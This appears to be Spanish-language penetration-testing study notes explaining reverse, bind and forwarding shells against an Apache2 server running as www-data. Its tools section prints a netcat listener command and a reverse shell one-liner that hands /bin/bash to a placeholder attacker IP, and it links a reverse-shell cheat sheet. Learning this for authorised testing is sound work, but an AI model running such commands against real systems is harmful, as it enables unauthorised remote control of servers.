> Una vez aplicado el reconocimiento de dominios, subdominios, tecnologias, versiones, etc, pasamos a explotar las vulnerabilidades segun corresponda.

## Reverse shell
- Tenemos una maquina **Atacante** y una maquina **Victima**
- La **Victima** esta corriendo un servidor de **Apache2** por el puerto 80
- La persona que ejecuta ese servidor **Apache2** es un usuario, puede ser **root**, universoparalelo, etc, tiene un nombre
- En un servicio web suele ser, el nombre, **www-data**
- El **Atacante** quiere ganar acceso a ese servidor y obtener una consola al fin y al cabo
- Entonces debe encontrar una forma de que el servidor le de una consola con la cual ejecutar esos comandos
- Este tipo de ataque es una **Reverse shell**

## Bind shell
- La diferencia con la anterior es que la maquina **Victima** dispone su bin/bash de forma temporal mediante un puerto
- Y la maquina **Atacante** escucha ese puerto y se conecta, porque la **Victima** dispuso su consola

## Forwarding shell
- El firewall te impide obtener una reverse shell
- Entonces hay que crear tuberias mediante las cuales ejecutamos comandos en archivos temporales que luego se guardan en otros archivos
- Desde el **Atacante** creamos un archivo malicioso que lee el servidor, porque esta todo correcto pero por detras ese archivo contiene codigo que la **Victima** ejecuta y guarda en otro archivo que el **Atacante** puede leer

## Herramientas
- netcat
- `ncat -nlvp 443`
- `ncat -e /bin/bash ip/atacante 443`
- [Chuletilla](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)